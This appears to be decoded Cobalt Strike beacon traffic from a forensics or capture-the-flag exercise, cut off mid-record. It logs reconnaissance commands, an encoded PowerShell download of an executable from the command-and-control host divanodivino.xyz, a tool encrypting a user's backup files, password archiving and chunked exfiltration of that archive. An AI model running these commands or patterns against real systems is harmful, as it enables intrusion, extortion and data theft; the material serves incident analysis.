@@ -1,0 +1,1439 @@
+Packet number: 44
+HTTP response (for request 38 GET)
+Length raw data: 5391
+HMAC signature invalid
+
+Packet number: 220
+HTTP response (for request 61 GET)
+Length raw data: 210554
+HMAC signature invalid
+
+Packet number: 234
+HTTP response (for request 231 GET)
+Length raw data: 4868
+HMAC signature invalid
+
+Packet number: 321
+HTTP response (for request 246 GET)
+Length raw data: 103069
+HMAC signature invalid
+
+Packet number: 336
+HTTP response (for request 332 GET)
+Length raw data: 9563
+HMAC signature invalid
+
+Packet number: 348
+HTTP response (for request 346 GET)
+Length raw data: 564
+HMAC signature invalid
+
+Packet number: 361
+HTTP response (for request 358 GET)
+Length raw data: 5918
+HMAC signature invalid
+
+Packet number: 560
+HTTP response (for request 369 GET)
+Length raw data: 262727
+HMAC signature invalid
+
+Packet number: 599
+HTTP response (for request 584 GET)
+Length raw data: 92787
+HMAC signature invalid
+
+Packet number: 852
+HTTP response (for request 613 GET)
+Length raw data: 314225
+HMAC signature invalid
+
+Packet number: 867
+HTTP response (for request 864 GET)
+Length raw data: 8841
+HMAC signature invalid
+
+Packet number: 892
+HTTP response (for request 886 GET)
+Length raw data: 5391
+HMAC signature invalid
+
+Packet number: 1055
+HTTP response (for request 902 GET)
+Length raw data: 210554
+HMAC signature invalid
+
+Packet number: 1068
+HTTP response (for request 1065 GET)
+Length raw data: 4868
+HMAC signature invalid
+
+Packet number: 1164
+HTTP response (for request 1082 GET)
+Length raw data: 103069
+HMAC signature invalid
+
+Packet number: 1174
+HTTP response (for request 1171 GET)
+Length raw data: 208
+Timestamp: 1725110293 20240831-131813
+Data size: 178
+Command: 78 COMMAND_EXECUTE_JOB
+ Command: b'%COMSPEC%'
+ Arguments: b' /C hostname'
+ Integer: 0
+Command: 78 COMMAND_EXECUTE_JOB
+ Command: b'%COMSPEC%'
+ Arguments: b' /C whoami'
+ Integer: 0
+Command: 78 COMMAND_EXECUTE_JOB
+ Command: b'%COMSPEC%'
+ Arguments: b' /C net user'
+ Integer: 0
+Command: 78 COMMAND_EXECUTE_JOB
+ Command: b'%COMSPEC%'
+ Arguments: b' /C net user /domain'
+ Integer: 0
+Command: 4 COMMAND_SLEEP
+ Sleep: 1000
+ Jitter: 0
+
+Packet number: 1181
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 672
+Counter: 2
+Callback: 30 CALLBACK_OUTPUT_OEM
+ARMAND-PC
+
+
+Counter: 3
+Callback: 30 CALLBACK_OUTPUT_OEM
+armand-pc\armand
+
+Extra packet data: b'\x00\x00'
+
+Counter: 4
+Callback: 30 CALLBACK_OUTPUT_OEM
+
+User accounts for \\ARMAND-PC
+
+-------------------------------------------------------------------------------
+Administrator            armand                   DefaultAccount           
+Guest                    WDAGUtilityAccount       
+The command completed successfully.
+
+
+
+Counter: 5
+Callback: 30 CALLBACK_OUTPUT_OEM
+The request will be processed at a domain controller for domain WORKGROUP.
+
+System error 1355 has occurred.
+
+The specified domain either does not exist or could not be contacted.
+
+
+
+Packet number: 1197
+HTTP response (for request 1193 GET)
+Length raw data: 9563
+HMAC signature invalid
+
+Packet number: 1271
+HTTP response (for request 1269 GET)
+Length raw data: 564
+HMAC signature invalid
+
+Packet number: 1303
+HTTP response (for request 1300 GET)
+Length raw data: 5918
+HMAC signature invalid
+
+Packet number: 1364
+HTTP response (for request 1361 GET)
+Length raw data: 64
+Timestamp: 1725110307 20240831-131827
+Data size: 33
+Command: 53 COMMAND_LS
+ Arguments length: 25
+ b'\xff\xff\xff\xfe\x00\x00\x00\x11C:\\Users\\Armand\\*'
+ MD5: b0310c0390fc658157a6498ecad3eedc
+
+Packet number: 1372
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 1508
+Counter: 6
+Callback: 22 CALLBACK_PENDING
+b'\xff\xff\xff\xfe'
+----------------------------------------------------------------------------------------------------
+C:\Users\Armand\*
+D	0	08/31/2024 16:09:31	.
+D	0	08/31/2024 16:09:31	..
+D	0	08/31/2024 14:11:42	3D Objects
+D	0	08/31/2024 14:08:34	AppData
+D	0	08/31/2024 14:08:34	Application Data
+D	0	08/31/2024 16:04:39	backup
+D	0	08/31/2024 14:11:42	Contacts
+D	0	08/31/2024 14:08:34	Cookies
+D	0	08/31/2024 16:05:33	Desktop
+D	0	08/31/2024 16:15:33	Documents
+D	0	08/31/2024 14:11:42	Downloads
+D	0	08/31/2024 14:11:42	Favorites
+F	49544352	08/31/2024 15:27:53	incident_data.pcapng
+D	0	08/31/2024 14:11:42	Links
+D	0	08/31/2024 14:08:34	Local Settings
+D	0	08/31/2024 14:11:42	Music
+D	0	08/31/2024 14:08:34	My Documents
+D	0	08/31/2024 14:08:34	NetHood
+F	1310720	08/31/2024 14:22:57	NTUSER.DAT
+F	524288	08/31/2024 14:08:34	ntuser.dat.LOG1
+F	430080	08/31/2024 14:08:34	ntuser.dat.LOG2
+F	65536	08/31/2024 14:11:38	NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TM.blf
+F	524288	08/31/2024 14:08:34	NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000001.regtrans-ms
+F	524288	08/31/2024 14:08:34	NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000002.regtrans-ms
+F	20	08/31/2024 14:08:34	ntuser.ini
+D	0	08/31/2024 14:13:21	OneDrive
+D	0	08/31/2024 14:13:13	Pictures
+D	0	08/31/2024 14:08:34	PrintHood
+D	0	08/31/2024 14:08:34	Recent
+D	0	08/31/2024 14:11:42	Saved Games
+D	0	08/31/2024 14:13:03	Searches
+D	0	08/31/2024 14:08:34	SendTo
+D	0	08/31/2024 14:08:34	Start Menu
+D	0	08/31/2024 14:08:34	Templates
+D	0	08/31/2024 14:11:42	Videos
+
+----------------------------------------------------------------------------------------------------
+Extra packet data: b'\x00'
+
+Packet number: 1400
+HTTP response (for request 1385 GET)
+Length raw data: 92787
+HMAC signature invalid
+
+Packet number: 1475
+HTTP response (for request 1472 GET)
+Length raw data: 80
+Timestamp: 1725110313 20240831-131833
+Data size: 40
+Command: 53 COMMAND_LS
+ Arguments length: 32
+ b'\xff\xff\xff\xfe\x00\x00\x00\x18C:\\Users\\Armand\\backup\\*'
+ MD5: 901f081f0be21b10e56951652c746138
+
+Packet number: 1482
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 532
+Counter: 7
+Callback: 22 CALLBACK_PENDING
+b'\xff\xff\xff\xfe'
+----------------------------------------------------------------------------------------------------
+C:\Users\Armand\backup\*
+D	0	08/31/2024 16:04:39	.
+D	0	08/31/2024 16:04:39	..
+F	898455	08/29/2024 15:56:53	daddy_front_of_office.jpeg
+F	1132245	08/29/2024 15:54:29	defcon_trip.jpeg
+F	206649	08/31/2024 10:38:50	dickpick.jpeg
+F	333490	08/29/2024 16:06:14	dont_waste_your_time_here.jpeg
+F	992298	08/29/2024 15:58:02	games_in_vegas.jpeg
+F	30420	08/29/2024 16:12:00	sausage.pdf
+F	1239003	08/29/2024 15:57:22	snack_in_pattaya.jpeg
+F	39578863	08/29/2024 15:40:13	Thunderbird_profile_backup.zip
+
+----------------------------------------------------------------------------------------------------
+
+Packet number: 1766
+HTTP response (for request 1524 GET)
+Length raw data: 314225
+HMAC signature invalid
+
+Packet number: 1809
+HTTP response (for request 1806 GET)
+Length raw data: 80
+Timestamp: 1725110320 20240831-131840
+Data size: 42
+Command: 5 COMMAND_CD
+ Arguments length: 34
+ b'C:\\Users\\Armand\\AppData\\Local\\Temp'
+ MD5: 7eb843e67d2367ab9f71e4592950c093
+
+Packet number: 1861
+HTTP response (for request 1858 GET)
+Length raw data: 8841
+HMAC signature invalid
+
+Packet number: 1982
+HTTP response (for request 1869 GET)
+Length raw data: 157248
+Timestamp: 1725110325 20240831-131845
+Data size: 157208
+Command: 10 COMMAND_UPLOAD
+ Arguments length: 157200
+ b'\x00\x00\x00\x0cPizzaBox.exeMZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00
+ MD5: 721ac7ac9757c3665d9bbea6c74bde53
+
+Packet number: 2017
+HTTP response (for request 2011 GET)
+Length raw data: 5391
+HMAC signature invalid
+
+Packet number: 2252
+HTTP response (for request 2089 GET)
+Length raw data: 210554
+HMAC signature invalid
+
+Packet number: 2314
+HTTP response (for request 2311 GET)
+Length raw data: 4868
+HMAC signature invalid
+
+Packet number: 2436
+HTTP response (for request 2352 GET)
+Length raw data: 103069
+HMAC signature invalid
+
+Packet number: 2446
+HTTP response (for request 2443 GET)
+Length raw data: 400
+Timestamp: 1725110343 20240831-131903
+Data size: 375
+Command: 78 COMMAND_EXECUTE_JOB
+ Command: b''
+ Arguments: b'powershell -nop -exec bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAGQAaQB2AGEAbgBvAGQAaQB2AGkAbgBvAC4AeAB5AHoAOgA4ADAAOAAwAC8AcwB2AGMAaABvAHMAdAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABBAHIAbQBhAG4AZABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAUABpAHoAegBhAEIAbwB4AC4AZQB4AGUA'
+ Integer: 1
+
+Packet number: 2568
+HTTP response (for request 2455 GET)
+Length raw data: 157184
+HMAC signature invalid
+
+Packet number: 2576
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 5716
+Counter: 8
+Callback: 30 CALLBACK_OUTPUT_OEM
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 0)</SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 3838)</SD></PR></MS></Obj><Obj S="progress" RefId="3"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 13838)</SD></PR></MS></Obj><Obj S="progress" RefId="4"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 23838)</SD></PR></MS></Obj><Obj S="progress" RefId="5"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 33838)</SD></PR></MS></Obj><Obj S="progress" RefId="6"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 43838)</SD></PR></MS></Obj><Obj S="progress" RefId="7"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 53838)</SD></PR></MS></Obj><Obj S="progress" RefId="8"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 63838)</SD></PR></MS></Obj><Obj S="progress" RefId="9"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 73838)</SD></PR></MS></Obj><Obj S="progress" RefId="10"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 83838)</SD></PR></MS></Obj><Obj S="progress" RefId="11"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 93838)</SD></PR></MS></Obj><Obj S="progress" RefId="12"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 103838)</SD></PR></MS></Obj><Obj S="progress" RefId="13"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 113838)</SD></PR></MS></Obj><Obj S="progress" RefId="14"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 123838)</SD></PR></MS></Obj><Obj S="progress" RefId="15"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 133838)</SD></PR></MS></Obj><Obj S="progress" RefId="16"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 143838)</SD></PR></MS></Obj><Obj S="progress" RefId="17"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 153838)</SD></PR></MS></Obj><Obj S="progress" RefId="18"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Writing request stream... (Number of bytes written: 157184)</SD></PR></MS></Obj><Obj S="progress" RefId="19"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Writing web request</AV><AI>174593042</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD>Writing web request completed. (Number of bytes remaining: 157184)</SD></PR></MS></Obj></Objs>
+
+Packet number: 2650
+HTTP response (for request 2647 GET)
+Length raw data: 96
+Timestamp: 1725110351 20240831-131911
+Data size: 60
+Command: 78 COMMAND_EXECUTE_JOB
+ Command: b''
+ Arguments: b'PizzaBox.exe --bake --key KouvostonMakkara'
+ Integer: 0
+
+Packet number: 2657
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 68
+Counter: 9
+Callback: 30 CALLBACK_OUTPUT_OEM
+Pizza per te: Diavola.exe
+
+
+Packet number: 2671
+HTTP response (for request 2667 GET)
+Length raw data: 9563
+HMAC signature invalid
+
+Packet number: 2741
+HTTP response (for request 2739 GET)
+Length raw data: 564
+HMAC signature invalid
+
+Packet number: 2792
+HTTP response (for request 2789 GET)
+Length raw data: 80
+Timestamp: 1725110362 20240831-131922
+Data size: 55
+Command: 78 COMMAND_EXECUTE_JOB
+ Command: b''
+ Arguments: b'Diavola.exe -d C:\\Users\\Armand\\backup'
+ Integer: 0
+
+Packet number: 2806
+HTTP response (for request 2803 GET)
+Length raw data: 5918
+HMAC signature invalid
+
+Packet number: 2834
+HTTP response (for request 2819 GET)
+Length raw data: 92787
+HMAC signature invalid
+
+Packet number: 2864
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 548
+Counter: 10
+Callback: 30 CALLBACK_OUTPUT_OEM
+Encrypting file: C:\Users\Armand\backup\daddy_front_of_office.jpeg
+Encrypting file: C:\Users\Armand\backup\defcon_trip.jpeg
+Encrypting file: C:\Users\Armand\backup\dickpick.jpeg
+Encrypting file: C:\Users\Armand\backup\dont_waste_your_time_here.jpeg
+Encrypting file: C:\Users\Armand\backup\games_in_vegas.jpeg
+Encrypting file: C:\Users\Armand\backup\sausage.pdf
+Encrypting file: C:\Users\Armand\backup\snack_in_pattaya.jpeg
+Encrypting file: C:\Users\Armand\backup\Thunderbird_profile_backup.zip
+
+
+Packet number: 3151
+HTTP response (for request 2912 GET)
+Length raw data: 314225
+HMAC signature invalid
+
+Packet number: 3186
+HTTP response (for request 3183 GET)
+Length raw data: 80
+Timestamp: 1725110380 20240831-131940
+Data size: 40
+Command: 53 COMMAND_LS
+ Arguments length: 32
+ b'\xff\xff\xff\xfe\x00\x00\x00\x18C:\\Users\\Armand\\backup\\*'
+ MD5: 901f081f0be21b10e56951652c746138
+
+Packet number: 3193
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 644
+Counter: 11
+Callback: 22 CALLBACK_PENDING
+b'\xff\xff\xff\xfe'
+----------------------------------------------------------------------------------------------------
+C:\Users\Armand\backup\*
+D	0	08/31/2024 16:19:33	.
+D	0	08/31/2024 16:19:33	..
+F	898464	08/31/2024 16:19:33	daddy_front_of_office.jpeg.diavola
+F	1132256	08/31/2024 16:19:33	defcon_trip.jpeg.diavola
+F	206656	08/31/2024 16:19:33	dickpick.jpeg.diavola
+F	333504	08/31/2024 16:19:33	dont_waste_your_time_here.jpeg.diavola
+F	992304	08/31/2024 16:19:33	games_in_vegas.jpeg.diavola
+F	1510	08/31/2024 16:19:33	README.txt
+F	30432	08/31/2024 16:19:33	sausage.pdf.diavola
+F	1239008	08/31/2024 16:19:33	snack_in_pattaya.jpeg.diavola
+F	39578864	08/31/2024 16:19:33	Thunderbird_profile_backup.zip.diavola
+
+----------------------------------------------------------------------------------------------------
+Extra packet data: b'\x00\x00\x00'
+
+Packet number: 3216
+HTTP response (for request 3213 GET)
+Length raw data: 8841
+HMAC signature invalid
+
+Packet number: 3287
+HTTP response (for request 3284 GET)
+Length raw data: 272
+Timestamp: 1725110388 20240831-131948
+Data size: 239
+Command: 78 COMMAND_EXECUTE_JOB
+ Command: b''
+ Arguments: b'powershell -nop -exec bypass -EncodedCommand NwB6ACAAYQAgAGEALgA3AHoAIAAtAHAASwBvAHUAdgBvAHMAdABvAG4ATQBhAGsAawBhAHIAYQBHAG8AdABQAHcAbgBlAGQATABvAGwAWABEACAAIgBDADoAXABVAHMAZQByAHMAXABhAHIAbQBhAG4AZABcAGIAYQBjAGsAdQBwACIA'
+ Integer: 1
+
+Packet number: 3304
+HTTP response (for request 3298 GET)
+Length raw data: 5391
+HMAC signature invalid
+
+Packet number: 3478
+HTTP response (for request 3314 GET)
+Length raw data: 210554
+HMAC signature invalid
+
+Packet number: 3488
+HTTP response (for request 3485 GET)
+Length raw data: 4868
+HMAC signature invalid
+
+Packet number: 3539
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 372
+Counter: 12
+Callback: 30 CALLBACK_OUTPUT_OEM
+
+7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
+
+Scanning the drive:
+1 folder, 9 files, 44412998 bytes (43 MiB)
+
+Creating archive: a.7z
+
+Add new data to archive: 1 folder, 9 files, 44412998 bytes (43 MiB)
+
+
+Files read from disk: 9
+Archive size: 44415599 bytes (43 MiB)
+Everything is Ok
+
+Extra packet data: b'\x00\x00'
+
+Packet number: 3643
+HTTP response (for request 3561 GET)
+Length raw data: 103069
+HMAC signature invalid
+
+Packet number: 3714
+HTTP response (for request 3711 GET)
+Length raw data: 48
+Timestamp: 1725110411 20240831-132011
+Data size: 12
+Command: 11 COMMAND_DOWNLOAD
+ Arguments length: 4
+ b'a.7z'
+ MD5: ac3042d30409097d1444b9b35892304f
+
+Packet number: 3749
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524424
+Counter: 13
+Callback: 2 CALLBACK_FILE
+ parameter1: 0
+ length: 44415599
+ filenameDownload: C:\Users\Armand\AppData\Local\Temp\a.7z
+
+Counter: 14
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 10be63210b6b3019c8a6b0e978aef5a6
+
+Packet number: 3800
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 15
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 34315258607580dce1223c8bb634040b
+
+Packet number: 3856
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 16
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 7bd4db6c0bdb3d7c45e29eeb7151af98
+
+Packet number: 3873
+HTTP response (for request 3869 GET)
+Length raw data: 9563
+HMAC signature invalid
+
+Packet number: 3921
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 17
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 2d3e92db4ddda26895accd27755acf31
+
+Packet number: 3969
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 18
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: d14bf4b373223f16b6ebfde290571bac
+
+Packet number: 4020
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 19
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 007748a99d3cb5d1b62e630ae7db1e01
+
+Packet number: 4070
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 20
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 983d3af495742fa20ccf293d0f0b97db
+
+Packet number: 4121
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 21
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: db0d08161bbde87dc1f7253d079782ac
+
+Packet number: 4136
+HTTP response (for request 4134 GET)
+Length raw data: 564
+HMAC signature invalid
+
+Packet number: 4182
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 22
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: b88bcfe9944053fb538c121cd0222efc
+
+Packet number: 4235
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 23
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 3fb7e266c647decde2cb0aaa1c8ebb1f
+
+Packet number: 4285
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 24
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 11f92ab9bc58086f968b84e2ce03205b
+
+Packet number: 4334
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 25
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 627cfbfda3499588a3066fcc0b6905c2
+
+Packet number: 4386
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 26
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 20d98cc31e503c4d4d362d3eace73d42
+
+Packet number: 4435
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 27
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 510111fc3eb4ba7cfd34849c028cd74d
+
+Packet number: 4450
+HTTP response (for request 4447 GET)
+Length raw data: 5918
+HMAC signature invalid
+
+Packet number: 4501
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 28
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: af360808ba599ab3c51214f3c69fde76
+
+Packet number: 4553
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 29
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 5ee8ef62f2f00dc7319a1e0d81a604db
+
+Packet number: 4602
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 30
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: da5081c4b77ea38e7f3aef953344fc4c
+
+Packet number: 4651
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 31
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 237c445ebf8db3af9f43848329757837
+
+Packet number: 4712
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 32
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 018b9f23ed2f8461963e0536b184a708
+
+Packet number: 4763
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 33
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 550549ad1831c8be63d08720449c759b
+
+Packet number: 4814
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 34
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: f3199b6da27a73f697edfdc046add48f
+
+Packet number: 4873
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 35
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: d32417ca6e3f59b95dabda09cac1238e
+
+Packet number: 4924
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 36
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 7d713bb16d09c1bcb64a4111074542e9
+
+Packet number: 4951
+HTTP response (for request 4936 GET)
+Length raw data: 92787
+HMAC signature invalid
+
+Packet number: 4996
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 37
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: c6f55e4d375e0b0de45aa30116ed1348
+
+Packet number: 5046
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 38
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: d063720e32a107167b1245a1bacb7774
+
+Packet number: 5105
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 39
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 11d9cbeab1f30a1c182a99e965a6911b
+
+Packet number: 5153
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 40
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 9804a637d56900d9bb9e6823befc75ae
+
+Packet number: 5207
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 41
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 29e14c00ca1c1778c58fca2e3ca6f7a5
+
+Packet number: 5258
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 42
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: e76aab9def10677460af658e274d2dcd
+
+Packet number: 5314
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 43
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 0bab9bcf4cfb06c536ddddbdfa10c92e
+
+Packet number: 5570
+HTTP response (for request 5328 GET)
+Length raw data: 314225
+HMAC signature invalid
+
+Packet number: 5617
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 44
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: e251adfbcd049966dddc1b6239894b25
+
+Packet number: 5667
+HTTP request POST
